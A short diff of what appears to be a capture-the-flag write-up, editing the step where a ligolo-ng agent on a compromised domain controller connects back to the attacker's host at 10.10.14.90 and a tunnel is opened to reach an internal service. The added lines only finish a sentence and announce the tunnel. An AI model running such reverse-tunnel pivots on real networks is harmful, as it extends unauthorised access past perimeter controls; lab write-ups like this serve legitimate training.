@@ -689,7 +689,7 @@ PS C:\Users\tstark\Documents> ./agent.exe -connect 10.10.14.90:11601 --ignore-ce
 time="2026-05-12T20:31:27-07:00" level=warning msg="warning, certificate validation disabled"
 time="2026-05-12T20:31:27-07:00" level=info msg="Connection established" addr="10.10.14.90:11601"
 ```
-Next ill execute the agent on the 
+Next ill execute the agent on the powershell session
 
 ```python
 ligolo-ng » INFO[0095] Agent joined.                                 id=a2deadce621d name="OFFICE\\tstark@DC" remote="10.129.32.165:55794"
@@ -701,3 +701,6 @@ ligolo-ng » session
 INFO[0132] Starting tunnel to OFFICE\tstark@DC (a2deadce621d) 
 [Agent : OFFICE\tstark@DC] » 
 ```
+Now i can start the tunnel!
+
+Now i should be able to access the internal service on 240.0.0.1:8083
